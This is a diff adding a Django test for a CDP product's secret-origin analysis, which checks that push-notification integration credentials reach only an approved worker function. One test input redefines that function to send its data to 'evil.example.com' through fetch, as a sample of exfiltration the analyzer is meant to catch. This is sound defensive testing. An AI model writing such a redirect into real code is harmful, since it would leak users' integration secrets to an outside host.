@@ -4,7 +4,7 @@ from django.test import SimpleTestCase
 
 from parameterized import parameterized
 
-from products.cdp.backend.integration_origins import integration_origins
+from products.cdp.backend.integration_origins import integration_origins, integration_worker_calls
 from products.cdp.backend.secret_origins import secret_origins
 from products.cdp.backend.templates import HOG_FUNCTION_TEMPLATES
 
@@ -12,6 +12,21 @@ SAMPLE_CONFIGS: dict[str, dict[str, Any]] = {
     "intercom": {"app.region": "US"},
     "salesforce": {"instance_url": "https://acme.my.salesforce.com"},
 }
+
+# The fan-out of the Node `template-native-push`, which hands its channels to the worker by id.
+PUSH_HOG = """
+if (not inputs.channels or length(inputs.channels) == 0) {
+    throw Error('No push channel configured. Select at least one channel.')
+}
+let res := sendPushNotification({
+    'integrationIds': arrayMap(channel -> channel.$integration_id, inputs.channels),
+    'distinctId': inputs.distinctId,
+    'payload': {'title': inputs.title}
+})
+if (not res.success) {
+    throw Error(f'Failed to send push notification: {res.error}')
+}
+"""
 
 TEMPLATE_INTEGRATION_INPUTS = [
     (f"{template.id}_{schema['key']}", template.code, schema["key"], schema["integration"])
@@ -56,3 +71,26 @@ class TestIntegrationOrigins(SimpleTestCase):
 
         assert allowed is not None
         assert isinstance(derived, frozenset) and derived and derived <= allowed, derived
+
+    @parameterized.expand(
+        [
+            ("firebase", "firebase", PUSH_HOG, True),
+            ("apns", "apns", PUSH_HOG, True),
+            ("kind_without_the_worker_function", "slack", PUSH_HOG, False),
+            (
+                "worker_function_replaced_by_the_code",
+                "firebase",
+                "let sendPushNotification := (x) -> fetch('https://evil.example.com', {'body': x})\n" + PUSH_HOG,
+                False,
+            ),
+            ("connection_also_printed", "firebase", PUSH_HOG + "print(inputs.channels)", False),
+        ]
+    )
+    def test_connection_handed_to_a_worker_function(self, _name: str, kind: str, hog: str, within: bool) -> None:
+        allowed = integration_origins(kind, {})
+        worker_calls = {"channels": integration_worker_calls(kind)}
+
+        derived = secret_origins(hog, {"channels": {"value": [1]}}, [], {"channels"}, {}, worker_calls)["channels"]
+
+        assert allowed is not None
+        assert (isinstance(derived, frozenset) and derived <= allowed) == within, derived
